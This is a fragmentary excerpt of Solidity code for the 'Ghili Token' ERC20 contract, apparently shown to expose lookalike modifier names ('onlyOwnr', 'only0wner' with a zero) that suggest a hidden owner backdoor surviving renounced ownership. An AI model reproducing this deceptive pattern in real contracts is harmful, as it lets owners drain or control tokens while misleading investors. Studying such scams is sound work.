...
abstract contract Ownable is Context {
    ...
    function renounceOwnership() public virtual onlyOwnr {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwnr {
        require(
            newOwner != address(0),
...
contract GHILI is ERC20, Ownable {
    ...
    constructor() payable ERC20("Ghili Token", "$GHL") {
    ...
    function addLP() external only0wner {
     ...
     */
    function removeStuckTokens(address to, uint256 amountToTransfer)
        external
        only0wner
    {
